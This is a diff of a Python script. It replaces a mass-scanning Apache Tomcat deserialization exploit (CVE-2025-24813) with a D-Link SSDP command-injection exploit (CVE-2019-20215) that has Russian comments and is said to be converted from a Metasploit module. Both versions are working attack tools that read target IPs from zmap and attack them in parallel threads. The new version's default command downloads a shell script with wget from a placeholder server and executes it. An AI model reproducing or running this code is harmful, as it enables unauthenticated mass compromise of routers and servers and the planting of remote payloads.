@@ -1,310 +1,168 @@
-import argparse
-import os
-import re
-import requests
-import subprocess
-import sys
-import threading
-from concurrent.futures import ThreadPoolExecutor, as_completed
-import queue
-try:
-    from urllib3.exceptions import InsecureRequestWarning
-    import urllib3
-    urllib3.disable_warnings(InsecureRequestWarning)
-except ImportError:
-    # Fallback for older versions
-    try:
-        from requests.packages.urllib3.exceptions import InsecureRequestWarning
-        import requests.packages.urllib3
-        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
-    except ImportError:
-        pass
-
-
-def remove_file(file_path):
-    try:
-        os.remove(file_path)
-        print(f"[+] Temporary file removed: {file_path}")
-    except OSError as e:
-        print(f"[-] Error removing file: {str(e)}")
-
-def check_writable_servlet(target_url, host, port, verify_ssl=True):
-    check_file = f"{target_url}/check.txt"
-    try:
-        response = requests.put(
-            check_file,
-            headers={
-                "Host": f"{host}:{port}",
-                "Content-Length": "10000",
-                "Content-Range": "bytes 0-1000/1200"
-            },
-            data="testdata",
-            timeout=1,
-            verify=verify_ssl
-        )
-        if response.status_code in [200, 201]:
-            print(f"[+] Server is writable via PUT: {check_file}")
-            return True
-        else:
-            print(f"[-] Server is not writable (HTTP {response.status_code})")
-            return False
-    except requests.RequestException as e:
-        print(f"[-] Error during check: {str(e)}")
-        return False
-
-def generate_ysoserial_payload(command, ysoserial_path, gadget, payload_file):
-    if not os.path.exists(ysoserial_path):
-        print(f"[-] Error: {ysoserial_path} not found.")
-        sys.exit(1)
-    try:
-        print(f"[*] Generating ysoserial payload for command: {command}")
-        cmd = ["java", "-jar", ysoserial_path, gadget, f"cmd.exe /c {command}"]
-        with open(payload_file, "wb") as f:
-            subprocess.run(cmd, stdout=f, check=True)
-        print(f"[+] Payload generated successfully: {payload_file}")
-        return payload_file
-    except (subprocess.CalledProcessError, FileNotFoundError) as e:
-        print(f"[-] Error generating payload: {str(e)}")
-        sys.exit(1)
-
-def generate_java_payload(command, payload_file):
-    payload_java = f"""
-import java.io.IOException;
-import java.io.PrintWriter;
-
-public class Exploit {{
-    static {{
-        try {{
-            String cmd = "{command}";
-            java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));
-            String line;
-            StringBuilder output = new StringBuilder();
-            while ((line = reader.readLine()) != null) {{
-                output.append(line).append("\\n");
-            }}
-            PrintWriter out = new PrintWriter(System.out);
-            out.println(output.toString());
-            out.flush();
-        }} catch (IOException e) {{
-            e.printStackTrace();
-        }}
-    }}
-}}
+#!/usr/bin/env python3
 """
-    try:
-        print(f"[*] Generating Java payload for command: {command}")
-        with open("Exploit.java", "w") as f:
-            f.write(payload_java)
-        subprocess.run(["javac", "Exploit.java"], check=True)
-        subprocess.run(["jar", "cfe", payload_file, "Exploit", "Exploit.class"], check=True)
-        remove_file("Exploit.java")
-        remove_file("Exploit.class")
-        print(f"[+] Java payload generated successfully: {payload_file}")
-        return payload_file
-    except subprocess.CalledProcessError as e:
-        print(f"[-] Error generating Java payload: {str(e)}")
-        sys.exit(1)
+D-Link Devices Unauthenticated Remote Command Execution in ssdpcgi
+Конвертированный из Ruby Metasploit модуля
+Работает с zmap: zmap -p 1900 -B 10M | python3 main.py
+CVE-2019-20215
+"""
 
-def upload_and_verify_payload(target_url, host, port, session_id, payload_file, verify_ssl=True):
-    exploit_url = f"{target_url}/uploads/../sessions/{session_id}.session"
-    try:
-        with open(payload_file, "rb") as f:
-            put_response = requests.put(
-                exploit_url,
-                headers={
-                    "Host": f"{host}:{port}",
-                    "Content-Length": "10000",
-                    "Content-Range": "bytes 0-1000/1200"
-                },
-                data=f.read(),
-                timeout=1,
-                verify=verify_ssl
-            )
-        if put_response.status_code == 409:
-            print(f"[+] Payload uploaded with status 409 (Conflict): {exploit_url}")
-            get_response = requests.get(
-                target_url,
-                headers={"Cookie": "JSESSIONID=absholi7ly"},
-                timeout=1,
-                verify=verify_ssl
-            )
-            if get_response.status_code == 500:
-                print(f"[+] Exploit succeeded! Server returned 500 after deserialization.")
-                return True
+import socket
+import sys
+import time
+from concurrent.futures import ThreadPoolExecutor
+
+class DLinkExploit:
+    def __init__(self):
+        self.rport = 1900  # SSDP port
+        self.timeout = 5
+        self.vector = "URN"  # URN или UUID
+        
+    def print_status(self, message):
+        print(f"[*] {message}")
+        
+    def print_good(self, message):
+        print(f"[+] {message}")
+        
+    def print_error(self, message):
+        print(f"[-] {message}")
+
+    def execute_command(self, target_ip, cmd):
+        """
+        Конвертированная функция execute_command из Ruby кода
+        """
+        try:
+            # Выбор вектора атаки (как в оригинальном Ruby коде)
+            if self.vector == "URN":
+                self.print_status("Target Payload URN")
+                val = f"urn:device:1;`{cmd}`"
             else:
-                print(f"[-] Exploit failed. GET request returned HTTP {get_response.status_code}")
-                return False
-        else:
-            print(f"[-] Payload upload failed: {exploit_url} (HTTP {put_response.status_code})")
+                self.print_status("Target Payload UUID") 
+                val = f"uuid:`{cmd}`"
+
+            # Создание UDP соединения (connect_udp из Ruby)
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            sock.settimeout(self.timeout)
+            
+            # Формирование SSDP пакета (точно как в Ruby коде)
+            header = "M-SEARCH * HTTP/1.1\r\n"
+            header += f"Host:239.255.255.250: {self.rport}\r\n"
+            header += f"ST:{val}\r\n"
+            header += "Man:\"ssdp:discover\"\r\n"
+            header += "MX:2\r\n\r\n"
+            
+            # Отправка пакета (udp_sock.put из Ruby)
+            sock.sendto(header.encode(), (target_ip, self.rport))
+            
+            # Закрытие соединения (disconnect_udp из Ruby)
+            sock.close()
+            
+            self.print_good(f"Эксплоит отправлен на {target_ip}")
+            return True
+            
+        except Exception as e:
+            self.print_error(f"Ошибка при атаке {target_ip}: {e}")
             return False
-    except requests.RequestException as e:
-        print(f"[-] Error during upload/verification: {str(e)}")
-        return False
-    except FileNotFoundError:
-        print(f"[-] Payload file not found: {payload_file}")
-        return False
 
-def get_session_id(target_url, verify_ssl=True):
-    try:
-        response = requests.get(f"{target_url}/index.jsp", timeout=7, verify=verify_ssl)
-        if "JSESSIONID" in response.cookies:
-            return response.cookies["JSESSIONID"]
-        session_id = re.search(r"Session ID: (\w+)", response.text)
-        if session_id:
-            return session_id.group(1)
-        else:
-            print(f"[-] Session ID not found in response. Using default session ID: absholi7ly")
-            return "absholi7ly"
-    except requests.RequestException as e:
-        print(f"[-] Error getting session ID: {str(e)}")
-        return None
+    def exploit(self, target_ip, command="id"):
+        """
+        Основная функция эксплуатации (аналог def exploit из Ruby)
+        """
+        self.print_status(f"Начинаем атаку на {target_ip}")
+        self.print_status(f"Команда: {command}")
+        self.print_status(f"Вектор: {self.vector}")
+        
+        # Выполняем команду (execute_cmdstager из Ruby упрощен до прямого выполнения)
+        return self.execute_command(target_ip, command)
 
-def check_target(target_url, command, ysoserial_path, gadget, payload_type, verify_ssl=True):
-    # Правильно извлекаем host и port из URL
-    if "://" in target_url:
-        # Формат: http://192.168.1.1:8080
-        url_part = target_url.split("://")[1]  # 192.168.1.1:8080
-        if ":" in url_part:
-            host = url_part.split(":")[0]  # 192.168.1.1
-            port = url_part.split(":")[1]  # 8080
+    def set_vector(self, vector):
+        """Установка вектора атаки: URN или UUID"""
+        if vector in ["URN", "UUID"]:
+            self.vector = vector
+            self.print_status(f"Вектор установлен: {vector}")
         else:
-            host = url_part
-            port = "80" if "http://" in target_url else "443"
-    else:
-        # Формат: 192.168.1.1:8080
-        if ":" in target_url:
-            host = target_url.split(":")[0]
-            port = target_url.split(":")[1]
-        else:
-            host = target_url
-            port = "80"
+            self.print_error("Неверный вектор. Используйте URN или UUID")
 
-    session_id = get_session_id(target_url, verify_ssl)
-    if session_id is None:
-        print(f"[-] Skipping target {target_url} due to connection issues")
-        return
-    print(f"[*] Session ID: {session_id}")
+def exploit_target(args):
+    """Функция для многопоточной атаки"""
+    ip, command, vector = args
+    exploit = DLinkExploit()
+    exploit.set_vector(vector)
+    return exploit.exploit(ip, command)
 
-    if check_writable_servlet(target_url, host, port, verify_ssl):
-        payload_file = "payload.ser"
-        if payload_type == "ysoserial":
-            generate_ysoserial_payload(command, ysoserial_path, gadget, payload_file)
-        elif payload_type == "java":
-            generate_java_payload(command, payload_file)
-        else:
-            print(f"[-] Invalid payload type: {payload_type}")
+def main():
+    print("=" * 70)
+    print("D-Link Devices Unauthenticated Remote Command Execution in ssdpcgi")
+    print("Конвертировано из Ruby Metasploit модуля в Python")
+    print("CVE-2019-20215")
+    print("Авторы оригинального модуля: s1kr10s, secenv")
+    print("=" * 70)
+    print()
+    
+    # Настройки по умолчанию (как в Ruby коде)
+    default_command = "wget http://your-server/shell.sh -O /tmp/shell.sh && chmod +x /tmp/shell.sh && /tmp/shell.sh"
+    default_vector = "URN"
+    
+    # Проверка аргументов
+    if len(sys.argv) > 1:
+        if sys.argv[1] in ["-h", "--help"]:
+            print("Использование:")
+            print("  zmap -p 1900 -B 10M | python3 main.py [команда] [вектор]")
+            print("  echo '192.168.1.1' | python3 main.py")
+            print()
+            print("Параметры:")
+            print("  команда  - команда для выполнения (по умолчанию: id)")
+            print("  вектор   - URN или UUID (по умолчанию: URN)")
+            print()
+            print("Примеры:")
+            print("  zmap -p 1900 -B 10M | python3 main.py 'id' URN")
+            print("  echo '192.168.1.100' | python3 main.py 'whoami' UUID")
             return
-
-        if upload_and_verify_payload(target_url, host, port, session_id, payload_file, verify_ssl):
-            print(f"[+] Target {target_url} is vulnerable to CVE-2025-24813!")
-        else:
-            print(f"[-] Target {target_url} does not appear vulnerable or exploit failed.")
-
-        remove_file(payload_file)
-
-def check_target_wrapper(args):
-    """Обертка для check_target с обработкой ошибок"""
-    target_url, command, ysoserial_path, gadget, payload_type, verify_ssl = args
-    try:
-        print(f"\n[*] Testing {target_url}")
-        check_target(target_url, command, ysoserial_path, gadget, payload_type, verify_ssl)
-    except Exception as e:
-        print(f"[-] Error testing {target_url}: {str(e)}")
-
-def process_targets_from_stdin(port, command, ysoserial_path, gadget, payload_type, verify_ssl=True, threads=50):
-    """Читает IP адреса из stdin и проверяет каждый с использованием многопоточности"""
-    print(f"[*] Reading targets from stdin on port {port}... (Using {threads} threads)")
+        
+        default_command = sys.argv[1]
+        
+    if len(sys.argv) > 2:
+        default_vector = sys.argv[2]
+    
+    print(f"[*] Команда для выполнения: {default_command}")
+    print(f"[*] Вектор атаки: {default_vector}")
+    print(f"[*] Порт: 1900 (SSDP)")
+    print("[*] Чтение IP адресов из stdin...")
+    print("[*] Используйте: zmap -p 1900 -B 10M | python3 main.py")
+    print()
     
     targets = []
+    
     try:
-        # Сначала читаем все цели
+        # Чтение IP адресов из stdin (для работы с zmap)
         for line in sys.stdin:
             ip = line.strip()
             if ip:
-                target_url = f"http://{ip}:{port}"
-                targets.append((target_url, command, ysoserial_path, gadget, payload_type, verify_ssl))
+                targets.append((ip, default_command, default_vector))
     except KeyboardInterrupt:
-        print(f"\n[*] Interrupted by user")
-        return
-    except EOFError:
-        pass
+        print("\n[*] Прервано пользователем")
     
     if not targets:
-        print(f"[*] No targets found")
+        print("[*] IP адреса не найдены")
         return
-        
-    print(f"[*] Processing {len(targets)} targets with {threads} threads...")
     
-    # Обрабатываем цели параллельно
-    with ThreadPoolExecutor(max_workers=threads) as executor:
-        try:
-            futures = [executor.submit(check_target_wrapper, target_args) for target_args in targets]
-            for future in as_completed(futures):
-                try:
-                    future.result()
-                except Exception as e:
-                    print(f"[-] Thread error: {str(e)}")
-        except KeyboardInterrupt:
-            print(f"\n[*] Interrupted by user")
-            executor.shutdown(wait=False)
-
-def process_targets_from_list(targets, port, command, ysoserial_path, gadget, payload_type, verify_ssl=True, threads=10):
-    """Обрабатывает список целей с использованием многопоточности"""
-    target_args = []
-    for target in targets:
-        # Если это просто IP, добавляем протокол и порт
-        if not target.startswith(('http://', 'https://')):
-            target_url = f"http://{target}:{port}"
-        else:
-            target_url = target
-        target_args.append((target_url, command, ysoserial_path, gadget, payload_type, verify_ssl))
+    print(f"[*] Найдено целей: {len(targets)}")
+    print("[*] Начинаем атаку...")
+    print()
     
-    print(f"[*] Processing {len(target_args)} targets with {threads} threads...")
+    # Многопоточная атака
+    successful = 0
+    with ThreadPoolExecutor(max_workers=50) as executor:
+        results = executor.map(exploit_target, targets)
+        for result in results:
+            if result:
+                successful += 1
     
-    # Обрабатываем цели параллельно
-    with ThreadPoolExecutor(max_workers=threads) as executor:
-        try:
-            futures = [executor.submit(check_target_wrapper, target_arg) for target_arg in target_args]
-            for future in as_completed(futures):
-                try:
-                    future.result()
-                except Exception as e:
-                    print(f"[-] Thread error: {str(e)}")
-        except KeyboardInterrupt:
-            print(f"\n[*] Interrupted by user")
-            executor.shutdown(wait=False)
-
-def main():
-    parser = argparse.ArgumentParser(description="CVE-2025-24813 Apache Tomcat RCE Exploit")
-    parser.add_argument("port", help="Port to scan (e.g., 8080, 80, 443)")
-    parser.add_argument("--targets", nargs="*", help="Specific target IPs or URLs")
-    parser.add_argument("--file", help="File with target IPs (one per line)")
-    parser.add_argument("--command", default="calc.exe", help="Command to execute")
-    parser.add_argument("--ysoserial", default="ysoserial.jar", help="Path to ysoserial.jar")
-    parser.add_argument("--gadget", default="CommonsCollections6", help="ysoserial gadget chain")
-    parser.add_argument("--payload_type", choices=["ysoserial", "java"], default="ysoserial", help="Payload type (ysoserial or java)")
-    parser.add_argument("--no-ssl-verify", action="store_false", help="Disable SSL verification")
-    parser.add_argument("--threads", type=int, default=10, help="Number of threads for parallel processing (default: 10)")
-    args = parser.parse_args()
-
-    # Проверяем источник целей
-    if args.targets:
-        # Используем цели из командной строки
-        print(f"[*] Using targets from command line: {args.targets}")
-        process_targets_from_list(args.targets, args.port, args.command, args.ysoserial, args.gadget, args.payload_type, args.no_ssl_verify, args.threads)
-    elif args.file:
-        # Читаем из файла
-        try:
-            with open(args.file, 'r') as f:
-                targets = [line.strip() for line in f if line.strip()]
-            print(f"[*] Loaded {len(targets)} targets from {args.file}")
-            process_targets_from_list(targets, args.port, args.command, args.ysoserial, args.gadget, args.payload_type, args.no_ssl_verify, args.threads)
-        except FileNotFoundError:
-            print(f"[-] File not found: {args.file}")
-            sys.exit(1)
-    else:
-        # Читаем из stdin (для работы с zmap)
-        process_targets_from_stdin(args.port, args.command, args.ysoserial, args.gadget, args.payload_type, args.no_ssl_verify, args.threads)
+    print()
+    print("=" * 50)
+    print(f"[*] Атака завершена")
+    print(f"[*] Обработано целей: {len(targets)}")
+    print(f"[*] Успешных атак: {successful}")
+    print("=" * 50)
 
 if __name__ == "__main__":
     main()
